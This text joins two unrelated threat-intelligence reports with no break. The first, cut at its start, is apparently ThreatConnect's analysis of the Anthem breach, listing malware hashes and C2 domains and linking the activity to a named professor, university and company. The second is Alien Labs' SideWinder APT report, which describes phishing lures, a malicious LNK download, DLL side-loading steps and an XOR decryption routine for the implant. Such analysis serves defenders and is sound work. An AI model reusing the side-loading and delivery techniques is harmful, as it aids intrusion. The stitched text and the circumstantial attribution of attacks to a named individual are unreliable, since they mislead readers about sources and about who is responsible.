Blue Cross Blue Shield provides healthcare coverage for about half the U.S. federal workforce. This means that their information was potentially compromised too. Unlike the Sony hack which was destructive in nature and meant to send a message for coercive purposes, the Anthem compromise was purportedly very covert, a fact which may suggest something about the adversary’s motives. As of late February 2015, there have not been any indications that the exfiltrated PII data was immediately commoditized on the black market for the purpose of enabling identity theft, as was the case in the Home Depot Breach.
Filling the Gaps:
Obviously, these high-level observations do not provide cybersecurity researchers a great deal of information to work with. However, when presented within the context of a Threat Intelligence Platform (TIP), an incomplete trail of evidence can highlight intelligence gaps, a study of which can orient threat researchers towards their analytic objectives. To this end, let’s examine what we wanted to discover in the context of the Anthem breach:

Who was responsible for the attack? What was the objective of the attack? Was it cyber theft, an espionage operation, or something different?
Who was targeted in the attack? The answer to this question, obscured as it may be, would likely shed some light on the objective of the breach. What was the timeline of the activity? The real power of a Threat Intelligence Platform is demonstrated when you are able to collect and maintain a robust dataset of threat indicators, both past and present, which can help orient you in the right direction in the wake of a newly discovered breach. Even when you do not have a good deal of information to start with (for example a file hash, or an IP address), you may find leads by pivoting through archived datasets until you uncover key pieces of the puzzle.
In the case of the Anthem breach, we were able to do just that. Anthem Themed Infrastructure & Signed Malware:
In September 2014, the ThreatConnect Research Team observed a variant of the Derusbi APT malware family, MD5: 0A9545F9FC7A6D8596CF07A59F400FD3, which was signed by a valid digital signature from the Korean company DTOPTOOLZ Co. Derusbi is a family of malware used by multiple actor groups but associated exclusively with Chinese APT. ThreatConnect Research began tracking the DTOPTOOLZ signature for additional signed malware samples and memorialized them within our Threat Intelligence Platform over time. Analyst Comment: The DTOPTOOLZ signature has also been observed in association with Korean Adware that is affiliated with the actual DTOPTOOLZ Co.
This adware should not be confused with the APT malware that is abusing the same digital signature. Later, in mid-November we discovered another implant that was digitally signed with the DTOPTOOLZ signature. This implant, MD5: 98721c78dfbf8a45d152a888c804427c, was from the “Sakula” (aka. Sakurel) family of malware, a known variant of the Derusbi backdoor, and was configured to communicate with the malicious command and control (C2) domains extcitrix.we11point[.]com and www.we11point[.]com. Through our Farsight  Security passive DNS integration, we uncovered that this malicious infrastructure was likely named in such a way to impersonate the legitimate Wellpoint IT infrastructure.
Passive DNS and historic DomainTools Whois data also provided insights that helped establish an initial timeline dating back to April 2014, when the faux domains came into existence and were later operationalized by the attackers. A Threat Intelligence Platform should allow for analysts to easily put together and organize such insights, collaborate around relevant analysis internally, and share the finished analysis with external industry groups and organizations. In the hopes that our community members could benefit from or provide further insight into this suspicious incident, we immediately shared our threat intelligence including indicators, signatures and analytical context to the ThreatConnect Medical and Health Community on November 13, 2014. This included sending out a notification to all stakeholders as well as our followers on Twitter. When the Anthem breach later came to light in early February, we re-shared the signatures, indicators and context freely to the entire ThreatConnect user base.
As we dug further, we expanded our understanding of the malicious we11point[.]com infrastructure, taking particular interest to the subdomains such as “extcitrix.we11point[.]com and “hrsolutions.we11point[.]com”. Note the “citrix”  and “hr” (human resources) prefixes that the adversary used to mirror legitimate remote infrastructure and employee benefits resources in the May 2014 timeframe. This provided initial insights as to the likely targeting themes and or vectors in which the adversary may have used when initiating their targeting campaign. wellpoint-evil2legit

The fact that the malicious infrastructure closely mirrored other legitimate Wellpoint infrastructure supported our hypothesis that the Derusbi / Sakula malware was configured to operate and persist within a specific target enterprise. Possible Premera Blue Cross Infrastructure:
Retrospective analysis of other targeted malware samples using the DTOPTOOLZ Co.
digital signature led to the identification of an “HttpBrowser” / “HttpDump” implant MD5: 02FAB24461956458D70AEED1A028EB9C (OpenOfficePlugin.exe), which was first observed on December 11, 2013. Although this malware sample is not Derusbi / Sakula, it too is strongly believed to be associated with Chinese APT activity and in fact may have also been involved in a Blue Cross Blue Shield targeting campaign as early as December 2013. premera-update

This particular binary is configured to connect to the static IP address 142.91.76[.]134. Passive DNS of this IP indicates that on December 11th, 2013, the same date as the malware sample was observed, the domain prennera[.]com also resolved to 142.91.76[.]134. It is believed that the prennera[.]com domain may have been impersonating the Healthcare provider Premera Blue Cross, where the attackers used the same character replacement technique by replacing the “m” with two “n” characters within the faux domain, the same technique that would be seen five months later with the we11point[.]com command and control infrastructure.
Section Summary:
The Derusbi / Sakula malware implant types are unique in that they have traditionally been seen within Chinese APT espionage campaigns. The “HttpBrowser” / “HttpDump” malware implant (while a different family of malware than Derusbi / Sakula) is also believed to be of Chinese origin, and was also digitally signed with the DTOPTOOLZ digitalsignature. This implant connected to a C2 node that overlapped with prennera[.]com. We believe that the prennera[.]com domain may be impersonating Premera Blue Cross (premera.com), using a similar character replacement technique seen in the we11point[.]com campaign. MATURING A THREAT INTELLIGENCE PROGRAM
VAE Inc.
Themed Infrastructure & Signed Malware
Another powerful attribute of ThreatConnect is the ability for analysts to logically group items such as atomic indicators, related documents or signatures, all of which may include individualized custom context enrichments and associations. Over time, the ability to memorialize groupings of related or like activity allows analysts to quickly uncover non-obvious relationships within their private datasets. This is exactly what happened as we continued to investigate these incidents. As industry analysts and media speculated Chinese APT involvement in the Anthem breach, our focus into the Derusbi / Sakula malware signed with the DTOPTOOLZ Co. digital signature shifted from the we11point[.]com incident to another cluster of activity that occurred later in May 2014.
We immediately reviewed Incident 20140526B: vaeit APT, an incident that we initially shared to our Subscriber Community on September 29, 2014 after conducting retrospective analysis. Well-VAE-OverlapsJust as was the case with the we11point[.]com and prennera[.]com incidents, the VAE, Inc. incident is also believed to be associated with Chinese APT espionage activity. In this case the adversary also used Derusbi / Sakula malware that was signed with the DTOPTOOLZ Co. digital signature and configured to communicate with faux infrastructure appearing to be masquerading as internal resources for the Department of Defense Contractor VAE, Inc.
Additionally, in response to an inquiry from KrebsOnSecurity, VAE, Inc. would later confirm that it had indeed been a target of a failed spearphishing attempt in May 2014 which used the malicious faux VAE, Inc. themed domain. The targeted incident relied upon the Sakula executable MD5: 230D8A7A60A07DF28A291B13DDF3351F which had a XOR 0x9A encoded C2 callbacks to the IP address 192.199.254[.]126 (registered to Wehostwebsites[.]com – “Tom Yu” of Baoan, Shenzhen City, Guangdong Province, China) as well as a hardcoded callback to sharepoint-vaeit[.]com. Passive DNS of the static C2 IP 192.199.254[.]126 revealed a single suspicious domain of interest – topsec2014[.]com.
This domain had historic resolution around May 8, 2014 within a month of the first observed Sakula activity using the IP 192.199.254[.]126 as C2. Using historic Whois, we discovered that topsec2014[.]com was initially registered by li2384826402@yahoo[.]com on May 6th, 2014. Although the li2384826402@yahoo[.]com registrant is likely a reseller given that it has been observed registering several thousands of other domains, the fact that it was used to register both the faux VAE, Inc. C2 infrastructure and the overlapping domain topsec2014[.]com within the same month suggests that there may be a relationship between the client of the reseller for the VAE, Inc. infrastructure and the client for topsec2014[.]com.
topsec2014-hist

Just four minutes after the initial registration of topsec2014[.]com, the Whois records were updated from the initial registrant, Li Ning – li2384826402@yahoo[.]com to TopSec China – TopSec_2014@163[.]com. This domain record has been unchanged since May 7th 2014. The we11point[.]com infrastructure and by extension the faux VAE Inc. infrastructure is associated with Cluster 2 of the ScanBox framework by PwC. The latest PwC update to ScanBox states that there are “links between the domain allegedly used in the Anthem hack (we11point.com) to Cluster 2 through shared WHOIS details.”

OPM Themed Infrastructure
One notable pattern was how the domain Whois registration information for the VAE, Inc.
themed infrastructure was quickly updated and obfuscated with pseudorandom 10 character gmx.com email addresses and using the names of various comic book characters from the Iron Man franchise. This comic-themed naming convention has been previously documented by our friends at Crowdstrike in what they characterize as being associated with a Chinese APT group they have dubbed “Deep Panda”. Leveraging our DomainTools partnership, we were able to correlate the outlier domain opm-learning[.]org. This domain was also purportedly registered by the Iron Man movie hero “Tony Stark” on July 28, 2014. This infrastructure naming convention suggests a possible Office of Personnel Management (OPM) theme.
However, in this case we lacked any specific sample of malware to verify our initial suspicions that this infrastructure was operational. The possible OPM reference in the domain name is noteworthy considering it was revealed in July of 2014 that OPM had been compromised by a likely state-sponsored Chinese actor in mid-March of that year. The fact this domain was registered after the breach occurred suggests that OPM could be an ongoing direct target of Chinese state-sponsored cyber espionage activity. Our attention then turned to the FBI Flash Report A-000049-MW that was publicly reported by Brian Krebs on February 6th, 2015. This FBI Flash Report was issued on January 27th, 2015, the same day an Anthem administrator detected suspicious activity according to an internal memo.
This memo goes on to indicate that the FBI would not be party to the Anthem breach until they were notified on January 29th, 2015; based on these facts we assess with high confidence that it is very unlikely that the FBI Flash Report was directly related to the Anthem breach. Rather, we suspect that the FBI flash report likely references the USIS breach that was announced on August 6, 2014, or the previous OPM breach, considering the statement that the breach involved “compromised and stolen sensitive business information and Personally Identifiable Information (PII) from US commercial and government networks through cyber espionage.”

The malware referenced within the FBI Report is associated with a Derusbi backdoor subvariant named “InfoAdmin” / “Kakfum” where the FBI specifically references open source reporting of “Deep Panda” as being related to the malware observed in the attack. The malicious infrastructure highlighted in the report are the domains images.googlewebcache[.]com and smtp.outlookssl[.]com. Both of these top level domains were included with other related domains, all of which were shared on September 16th, 2013 to the ThreatConnect Subscriber Community in Incident 20130823C: Some.Trouble APT Domains, roughly a year and half prior to the FBI Flash report. It is important to mention that both the domains images.googlewebcache[.]com and smtp.outlookssl[.]comas were also previously identified in an October 2014 PwC blog post as seen within Cluster 1 of the Scanbox framework, while the Sakula activity with we11point and VAEIT is contained within Cluster 2 of that report.
This implies that the actor referenced within the FBI Flash report uses shared capabilities (in this case the ScanBox kit) with the Sakula / we11point actor. Section Summary:
The Derusbi / Sakula malware seen in both the we11point[.]com and VAE Inc. campaigns were structurally the same and digitally signed with the DTOPTOOLZ signature. The emerging theme is that this particular signature and family of malware is highly indicative of a particular Chinese APT activity. Within this web of malicious infrastructure, there is an interesting overlap with the topsec2014[.]com domain and attack infrastructure.
ThreatConnect Research identified a domain opm-learning[.]org that had a similar superhero themed WHOIS registrant to the Sakula / VAE Inc. infrastructure. The possible OPM reference is noteworthy considering the Office of Personnel Management (OPM) was compromised in March 2014. Additionally, an FBI Flash Report 0000-49MW referenced indicators that were possibly associated with the USIS hack and a Derusbi variant called “Kakfum” / “InfoAdmin”. Both the FBI Flash infrastructure and the Sakula / VAE Inc.
infrastructure are tied to the capability usage of the ScanBox framework, residing in Clusters 1 and 2 respectively. Unveiling Song Yubo and Southeast University:
The Professor
We conducted open source research in pursuit of further information on the TopSec_2014@163[.]com email registrant. A keyword search returned several results for “topsec2014@163[.]com” in association with a number of academic institutions in Nanjing, China. Although the email address wasn’t an exact match to the topsec2014[.]com domain registrant (notice the absence of the underscore), such a similarity warranted further investigation.Screen Shot 2015-02-25 at 5.20.37 PMWe examined the links for any relevant intelligence, and discovered that nearly all of the search results led to pages that contained an announcement for an information security competition sponsored by the Southeast University-Topsec Information Security and Mobile Internet Technology Joint Research Center. This entity appears to be a joint research venture between the University and Chinese networking giant Beijing Topsec Network Security Technology Co., a.k.a.
Beijing Topsec. Screen Shot 2015-02-23 at 9.22.35 AM

The announcements list a Professor “Song Yubo” as the point of contact for the event, and directs interested parties to his email address, topsec2014@163[.]com, for further questions. Translation

According to his LinkedIn page, Song is a Teacher at the Southeast University, specifically interested in the field of telecommunications. Additionally, he is an avid researcher, and has published numerous academic papers on computer network exploitation on various e-journal publication sites, such as Google Scholar. Further, he lists skills such as “cryptography,” “penetration testing” and “computer network security,” etc.
on his Research Gate profile. yubo-stacked-china-hack

As we continued to develop a profile on Professor Song, we began to have the sense that his interest in information security research strongly overlapped with that of someone who might be interested in or at least capable of conducting sophisticated cyber attacks. However, interests alone are not enough to warrant reasonable suspicion, so we had to do more digging. Additionally, the soft link between TopSec_2014@163[.]com and topsec2014@163[.]com alone was not sufficient to make associations with any reasonable confidence, but as it turns out, Yubo has in fact been previously named as a person of interest in the context of offensive Chinese cyber activity. The University
In March 2012, Northrop Grumman presented a commissioned report to Congress detailing Chinese cyber warfare capabilities.
The report asserts with high confidence that both Song and the Information Security Research Center at Southeast University have received numerous state-sponsored research grants, and by extension, cooperated with the Government of China in conducting information security research and development (R&D). As stated on Southeast University’s own website, the main purpose of these grants are to develop technical acumen amongst its students via providing support for “state-owned scientific research institutions, state key enterprises, government agencies and People’s Liberation Army (PLA) units.”relationshipsSoutheast University is one of only three Chinese academic institutes that receives funding from all five of the State grant programs. Song himself has also conducted his fair share of state-sponsored research, notably under the National Ministry of State Security 115 Program – a highly sensitive research grant to fund ambiguous information warfare R&D, almost certainly in support of PLA programs. The Competition
As we can see, the evidence continued to stack up. The real smoking gun, however, was when we began to notice a strong temporal overlap with the various stages of the TOPSEC Cup that Song and Beijing Topsec were organizing, and the registration dates of malicious infrastructure as well as the malware compilation dates.
Based upon the translated registration form that we obtained from Song Yubo’s personal Baidu document sharing account, open registration for the “TOPSEC Cup” began on May 4th, 2014 and would close on May 14th, 2014. The details of the competition that were shared on the announcement are extremely ambiguous, and probably for good reason. The introductory paragraph mentions that the primary goal of the event is to facilitate the training and discovery of new talent, noting that exceptional participants would receive priority consideration for internships and jobs with Beijing Topsec. The event itself was broken down into several distinct rounds of competition. Firstly, the preliminary round required that all eligible registrants would attempt to remotely access and navigate through the network.
Should a participating team perform exceptionally in the preliminary qualifying round, they would be invited to participate in the final round on-site in Nanjing. In this final round, participants would be required to build their own “information systems and network environments.”  The announcement notes that the students must rely upon their own laptop and software tools to accomplish this task. Further, the announcement notes that participants are prohibited from attacking the provided server as well as their competitors. Section Summary:
Song Yubo and his research center at Southeast University appear to be central players in this narrative, as highlighted by their financial connections to the government of China, in particular the Ministry of State Security (MSS), China’s premier human intelligence agency. If the MSS was involved, we can deduce that the Anthem hack could have been for the purposes of gathering sensitive information for follow-on HUMINT targeting via blackmail, asset recruitment or technical targeting operations against individuals at home.
Song’s use of the topsec email alias suggests a greater association w/ TOPSEC. It seems as if the competition is almost certainly the cause for the topsec2014[.]com domain. What is very curious, however, is the initial registration by the reseller li2384826402@yahoo[.]com, which is a tactic seen within the confirmed malicious faux VAE Inc.infrastructure. The overlap between the competition website and the static command and control infrastructure seen in the Derusbi / Sakula implant is was likely an error made by the attackers. Tianrongxin, a.k.a.
Beijing Topsec Technology Co:
The Company
To enhance our open-source capabilities, we partnered up with Dr. James Mulvenon and his team of China experts at Defense Group, Inc. (DGI). We shared with them everything that we knew at the time, walking through the technical details which led us all the way to Song Yubo and the competition announcement. From there, they were able to uncover a wealth of very consequential background information on Beijing Topsec Technology Co (Beijing Topsec), the sponsoring organization for Song Yubo’s information security competition.
DGI’s research indicated that Beijing Topsec is one of the largest information security hardware providers in China. In 1996, they were the first Chinese company to break into the market with the release of China’s first indigenously-manufactured firewall. Since then, they have expanded their business to include a consulting practice focused on issues such as vulnerability mining, software code analysis, threat intelligence, and encryption R&D, amongst other things. The company served as a core technical support unit for network security at the 2008 Olympic Games – an event which was tightly controlled by the state. Additionally, Beijing Topsec is a known partner of the Chinese military.
Since 2009, the company has possessed information publication credentials for military network procurement. Since 2013, they have been publicly recognized as the Chinese equivalent of a cleared defense contractor. The links between Beijing Topsec and the Chinese government are fairly substantial, highlighted by long-standing partnerships between even the most shadowy elements of the Chinese military. The Leaked Cable
A very compelling piece of evidence is found in the contents of a leaked 2009 diplomatic security cable from the Department of State, published by The Guardian. The cable is a daily digest of Diplomatic Security alerts – essentially a situational awareness primer for State Department employees to inform them of new and existing threats.
In one section, the cable highlights that the Founder of Beijing Topsec, He Weidong, had openly talked about receiving directives from the PLA in an interview with China News Network. In the interview, the founder quite curiously states that Topsec is less a commercial entity, but rather a research institute, and that the company received about half of its start-up capital directly from the PLA. The cable further claims that Topsec actively recruits for the PLA cyber army. lin-yong-lion-china-hack

It would also appear that not only does Beijing Topsec have deep ties to state-run cyber activity, but also within the independent hacker community as well. Of note, the company hired the notorious hacker Lin Yong, a.k.a.
“Lion” (of the Honker Union of China) in the early 2000s as a security service engineer and to conduct network training. Section Summary:
It is not surprising that the Chinese government would be interested in partnering with a private organization such as Beijing Topsec for use as a front for state-sponsored activity. The association between Southeast University and Beijing Topsec as manifested in the joint information security research center highlights the possibility of growing links between state-sponsored activity and academic institutions, particularly those that receive funding from the central government. All in all, it would seem that China is pursuing a unified approach to cyber operations, relying on all unique facets of the workforce: academia, private industry, and independent hackers, as well as the PLA to achieve their strategic goals. Conclusion:
The Anthem breach exposes the insidious reality of modern Chinese cyber espionage as it continues its unrelenting strikes at the soft underbelly of the American way of life.
Moreover, it demonstrates the imposing yet increasingly common reality of conducting threat intelligence analysis without substantial threat intelligence to start with. Fortunately for us, we were able to deduce informed answers to some of the outstanding questions to this breach by scrutinizing our archival data troves that are efficiently stored within our Threat Intelligence Platform and partner integrations. In the field of cyber security, industry professionals must learn to play the long game in order to generate a proactive sense of situational awareness, allowing for greater efficiency and flexibility in mitigating future threats. Additionally, this incident underscores the frustrating disparity of the industry when it comes to naming conventions. With so many threat actors and indicators floating around, it is can be frustrating to keep track of all the disparate pieces of evidence, especially when countless naming conventions are applied.
Without the use of a Threat Intelligence Platform to keep track of the flood of incoming threat data, this task would be extraordinarily time consuming at best and crippling at worst. Moving forward, it is important to bear in mind that the adversary, regardless of country of origin, shall almost certainly leverage our every weakness against us. Even something as seemingly innocuous as confusion over names can easily consume analytical bandwidth, creating a window of opportunity to strike. We – that is security professionals, private industry and governments alike – must proactively harden our network defenses and hasten our incident responses as a united, synchronous entity. We have shared details on Song Yubo and affiliated indicators within the ThreatConnect Common Community.
This share also includes the full-text DGI “BLUE HERON” research which provides greater insight into Song Yubo, Southeast University and Beijing Topsec. All things considered, the industry must learn to adopt a cooperative defense mindset in the hopes of rebuffing future attacks. The most resolute defense we have is each other, so be like ThreatConnect Research and start actively defending your own community from the next big breach. Contact us to learn more.
Page 1 A Global Perspective of the SideWinder APT Summary AT&T Alien Labs has investigated the adversary group publicly known as SideWinder in order to historically document its highly active campaigns and identify a more complete picture of targets, motivations, and objectives. Through our investigation, we have uncovered a collection of activity targeting government and business throughout South Asia and East Asia spanning many years. Our findings are primarily focused on activity since 2017, however the group has been reportedly operating since at least 2012. Alien Labs along with other security researchers have assessed with low to medium confidence that the group is operates in support of India political interests based on targets, campaign timelines, technical characteristics of command and control (C2) infrastructure and malware, association with other known India interest APTs, in addition to past cyber threat intelligence reporting and our private telemetry. SideWinder is a highly active adversary primarily making use of email spear phishing, document exploitation, and DLL Side Loading techniques to evade detection and to deliver targeted implants.

The adversary activity remains at a consistent rate and AT&T Alien Labs recommends the deployment of detections and retrospective analysis of shared indicators of compromise (IOCs) for past undetected activity. In this report we are providing a timeline of known campaigns and their associated IOCs, in addition to a large number of campaigns/IOCs which have not been previously reported or publicly identified. Page 2 Analysis Purpose & Resources AT&T Alien Labs authored this report to share information and improve the understanding and collection potential of SideWinder activity. The purpose of providing this report is to help defenders in retrospective analysis objectives, provide guidance to researchers with our own findings, and share a foundation of knowledge on a specific and unique threat actor for defender identification and future industry reporting. The primary resources AT&T Alien Labs used for this analysis includes private Alien Labs telemetry and intelligence, the Alien Labs Open Threat Exchange™ (OTX™), public file repositories and sandboxes (OTX, VirusTotal, Any.Run, MalShare), and multiple infrastructure analysis supporting tools (BinaryEdge, RiskIQ).

Additionally, as can be found in the “Past Reporting Timeline” section, we have used publishings on SideWinder activity to help supplement the details of activity and identify noteworthy multinational patterns outside our own perspective and data. Past Reporting Timeline Below is a timeline of relevant and noteworthy publicly reported activity on the SideWinder APT group. Alien Labs has reviewed and tracked SideWinder with the help of the many sources referenced in this timeline. It is important to note; some past publications have contained errors we have retrospectively identified. A complete list of indicators (IOCs) from each publication can be found in Appendix C. This list has been curated and supplemented with our own findings. Additionally, we have provided secondary links through archive.org in order to provide past content archived and available to future readers if the publication from a source is no longer hosted online. It is important to note all sources, including the authors of this report, are limited to their own data, telemetry, and knowledge at the time of publication.

April 12, 2018: The first public naming of the SideWinder APT group was from Kaspersky on April 12th 2018 [archived], in an APT Trends summary. According to the Kaspersky blog, SideWinder has been active since at least 2012 and has been potentially authored by an Indian company. Kaspersky also released a more detailed private intelligence report in the first quarter of 2018, according to their blog post. May 2, 2018: Tencent Security published a blog [archived] on SideWinder. In this blog, they name the actor “Rattlesnake” and “T-APT-04”. The blog shared an overview of the attack process using malicious documents as a delivery mechanism for a RAT (remote access trojan) install. July 16, 2018: Sebastien Larinier published [archived] an analysis of a SideWinder-linked malicious document. The analysis breaks down the exploit and infection process, which is related to activity previously reported by Tencent. July 31, 2018: Sebastien Larinier published a blog [archived] with a newly identified malicious document that makes use of a similar malicious document which generates a toolkit linked to previously SideWinder activity; however, in this case the malicious document was potentially associated with the Chinese adversary group “1973CN,” known for their Vietnam-focused campaigns [archived] in 2016.

October 18, 2018: Sebastien Larinier also shared an update [archived] on a new infection process observed in a SideWinder malicious document. We excluded some of the IOCs in this report, as we assess with moderate confidence they are not related to SideWinder activity. Page 3  February 5, 2019: Anomali first publicly reported [archived] on the shared rich text format (RTF) weaponizer used by multiple Chinese APT groups, with links to known SideWinder activity. This shared toolkit has since been primarily referred to as the “Royal Road” or “8.t” Weaponizer. Anomali presented various intriguing assessments, such as a potential shared exploit and weaponizer supply chain used between Goblin Panda, APT40, and ICEFOG (Chinese APTs) and then later with SideWinder (India APT). February 15, 2019: The Government of Pakistan’s NTISB issued a “prevention against cyber espionage advisory" (no. 3) [archived] which contains technical indicators related to a SideWinder campaign targeting Pakistan military organizations.

The adversary was not identified in this report; however Alien Labs was able to attribute this activity to SideWinder. February 20, 2019: The Government of Pakistan’s NTISB issued an espionage advisory (no. 4) [archived] related to a SideWinder campaign against defense and intelligence organizations within Pakistan. The adversary was not identified in this report; however Alien Labs was able to attribute this activity to SideWinder. February 26, 2019: Tencent reported on SideWinder [archived] activity potentially targeting Pakistan government organizations, based on malicious document lures. April 1, 2019: The Government of Pakistan’s NTISB issued cyber espionage advisory no. 8 [archived] in which SideWinder masqueraded as the Ministry of Interior in a campaign against other Pakistan government organizations. The adversary was not identified in this report; however Alien Labs was able to attribute this activity to SideWinder. May 8, 2019: The Antiy CERT team published an analysis of SideWinder activity [archived] targeting Pakistan government officials of Pakistan.

The analysis summarized findings of attack methods using English lures involving the military of China and Pakistan. September 6, 2019: Rising Network Security Technology company of Beijing, reported on a SideWinder campaign [archived] they discovered that targeted multiple embassies in China, in addition to an unnamed Chinese defense technology company foreign representative office. September 9, 2019: Tencent published an article on the summary of India/Pakistan attacks [archived], geopolitical context, and general actor overviews. October 4, 2019: SideWinder and its use of the Royal Road Weaponizer were further references in a joint Anomali and Proofpoint presentation at the annual Virus Bulletin conference (Slides [Archived]/Video). This presentation adds further clarification to a Feb. 5, 2019, blog by Anomali. The author's discussion on the Weaponizer lifecycle is a noteworthy detail to consider in the past relations of supply chain / relations between the various Chinese actors and SideWinder. October 18, 2019: Rising reported on more observed activity [archived] targeting additional government and defense organizations in China.

October 29, 2019: Rising reported on a SideWinder campaign [archived] targeting military organizations of Pakistan. November 11, 2019: The Government of Pakistan’s NTISB issued advisory no. 22 [archived] detailing SideWinder as an Indian APT, in addition to sharing technical indicators and recommendations. This appears to be the first public attribution of SideWinder by the NTISB. January 1, 2020: Shadow Chaser Group published a 2019 summary report [archived] of SideWinder activity. January 6, 2020: Trend Micro first publicly reported [archived] on new SideWinder Android OS malware, potentially active since March 2019. The mobile apps were available on the Google Play    Page 4 store and were mimicking camera and file management apps. The apps operated in a multi-stage infection process, using CVE-2019-2215 and resulting in a full compromise of victim devices. January 17, 2020: At the Japan Security Analyst Conference, SideWinder and its past use of Royal Road Weaponizer were detailed in the presentation titled “An Overhead View of the Royal Road” by Rintaro Noike and Shota Nakajima of nao_sec (Slides [archived]/Video).

April 14, 2020: Tencent reported on SideWinder taking advantage of the of COVID-19 pandemic [archived] in a campaign against Pakistan military organizations. Some of the same details in the Tencent blog were also released in advisory no. 5 [archived] from the Government of Pakistan’s NTISB on the same day. May 20, 2020: RedDrip Team published an analysis [archived] on the SideWinder campaign against the Pakistan Government reported on April 14th. One noteworthy detail This report included one of the first public references to SideWinder operating phishing websites. July 12, 2020: the Shadow Chaser Group publicly shared details [archived] on a collection of more recent SideWinder activity, including an analysis of the infection process and potential Bangladesh and Chinese university targets. December 9, 2020: TrendMicro released a blog [archived] with a detailed analysis of SideWinder credential phishing websites and targets, in addition to identification of mobile applications potentially being built for future attacks.

Targets The SideWinder APT has been targeting governments and businesses throughout South Asia and East Asia spanning many years. Specifically, there is a recurring effort of targeting military and government organizations. Primary targets of government and military targeting has been Pakistan, China, Nepal, Afghanistan. There were also many smaller operations observed targeting other nations in the region, such as Myanmar, Qatar, Sri Lanka, and Bangladesh. We assess with moderate confidence that various businesses operating in the national defense technology, scientific research, financial, energy, and mineral industries of the same nations were also targeted in SideWinder campaigns. Its critical to acknowledge that this is not the complete picture of the group’s operations, and they are likely conducting operations against other targets. Our assessment of the targets are based on infrastructure design/naming trends, government notifications, publicly available files unique to specific sources, phishing pages, previous public reporting, and Alien Labs private telemetry.

Technical Campaign Details Initial Access SideWinder has been observed initiating attacks with spear phishing emails against their target organizations. Attacks are primarily delivering malicious attachments, but credential phishing has also been a technique used by the group. The December 2020 blog from Trend Micro does an excellent analysis of the phishing websites. Ultimately, these websites are used to collection credentials and occasionally deliver similar files to the attachments detailed below. Page 5 Email lures and their attachments or links are often uniquely crafted to the target organization, which include content that the recipients would often expect to receive or benefit from reading. Since the group has primarily targeted government and military organizations, email lures are often related to political events and/or private documents generally considered standard for such organizations to receive. Figure 1 includes a screenshot of the complete content from an April 2019 campaign phishing email (SHA256: be71f2d17037a1a1fbbe8d7f3f4b45c72132a64224e3d3f13aa66a2249df9232) with attachment (SHA256: ac4fd2681c3a9d087ff4cabb44b93753711e81c6574c837ca33f74fef37f3cf4).

Figure 1. SideWinder Phishing Email Screenshot captured via VirusTotal. Malicious attachments are the standard approach over the use of malicious links in phishing emails. Attachments have most commonly been RTF files, and less commonly DOCX, LNK, and ZIP files. Code Execution The RTF files continually use CVE-2017-11882 to exploit the target host and initiate the compromise. LNK files are used for code execution to download remote files from adversary-controlled infrastructure. ZIP files have been observed simply as a way to supply LNK files, potentially an attempt to evade automatic email filtering. One example of a ZIP to LNK delivery method was also detailed in the Government of Pakistan’s NTISB advisory No. 22 of November 2019. The ZIP file contained a malicious LNK file (SHA256: 61669c7e59036ae95a2886cf5a42a89633ff8c53cf75e7cb89e0be9f6d4030f4) which performs a remote download from paknavy.gov[.]pk.ap1-port[.]net/images/E7B62E1D/1182/2258/fc8fe2b4/692cd02 to ultimately download a malicious HTA file. Page 6 Figure 2. Scan of NTISB November 2019 Advisory, via National University of Technology Pakistan.

The HTA files themselves vary over the years, often evolving with each campaign in attempt to complicate analysis and detection capabilities. The HTA files generally have the same role in each campaign. This includes: 1. Act as the downloader to initialize the infection from the C2 server. a. Further HTA Downloads (multistage) or direct loader DLL download and execution. 2. Load encoded lure document (such as PDFs). a. Often a decoy document and shown to users while the attack is conducted without their knowledge. 3. Report unique host details to C2 server. a. Basic antivirus checks The scripts shift between being JavaScript, PowerShell, and VBScript. Additionally, the amount of code obfuscation and encoding within the script has increased over time. The scripts have also benefited from using versions of open source toolkits such as Koadic and StarFighters to maliciously deliver the final payload. Ultimately, the many unique implementations of the HTA file scripts lead to drop and execution of the loader through the DLL side loading technique.

Page 7 Trojan Analysis DLL Side loading Execution Flow As part of its infection chain, SideWinder is using a technique called DLL Side Loading to load and execute its final implant payload on target machines. The malware is hijacking a clean file, by forcing a system program to load its malicious DLL rather than its original one. This approach allows the implant to reside only in memory of the victim machine, avoiding detection through generic file scans. 1. The script copies a clean system EXE file, which is often whitelisted from detection, to the malware directory. In the case with various SideWinder methods, this would be the legitimate rekeywiz.exe Windows OS application file (SHA256: fa86b5bc5343ca92c235304b8dcbcf4188c6be7d4621c625564bebd5326ed850 2. Next the script sets its own DLL file name to the same as a clean file the application needs to load during execution, which in this example is "Duser.dll". It is then placed into the same folder as the clean application.

3. A configuration file is made for the system exe file to avoid conflicts with DLL file versions. (for example: "rekeywiz.exe.config") Figure 3: Directory containing clean application of the copied “rekeywiz.exe”, the malicious DLL “Duser.dll”, and the configuration file to avoid version conflicts “rekeywiz.exe.conf”, captured via Alien Labs threat analysis. Figure 4: Content of “regkeywiz.exe.conf”’ to avoid version conflict when loading ‘Duser.dll’, captured via Alien Labs threat analysis. 4. The script will execute the clean EXE file, which will then load and execute its malicious DLL as if it were the original clean version, which itself decrypts and loads the final implant into memory. Figure 5: Malicious “DUser.dll” loads upon “LoadLibrary” API function call of clean program, captured via Alien Labs threat analysis. Page 8 Malicious DLL Analysis Next, we can follow the execution of the new Duser.dll file through the DLL Side loading technique. Duser.dll is responsible for decrypting and executing the final payload into memory, which has been written as a randomly named temporary file (.tmp) on disk.

This process is completed through the clean system application used for the side-loading technique, regkeywiz.exe. The Duser.dll does not contain malicious code by itself, but rather acts as a component to load the implant. Figure 6: DLL reads the content of decrypted file ‘MpyutHk.tmp’ and execute it in the memory of the clean application “regkeywiz.exe”, captured via Alien Labs threat analysis. As mentioned, the content of the temporary file is the encrypted final and main payload of the infection process. The first 32 bytes are the decryption key for a XOR loop. The function below can be used to decrypt the file. def decrypt(input_file, output_file):  f = open(input_file, 'rb')  data = f.read()  f.close()  file_length = len(data) - 32  xor_key = data[0:32]  arr = bytearray(data[32:])  for i in range(file_length):  arr[i] ^= xor_key[i % 32]  f = open(output_file, 'wb')  f.write(arr)  f.close()    Page 9 Final Implant As mentioned above, the implant is an encrypted temp file, which is initiated by the loader through the DLL side loading technique, decrypted, and then executed.

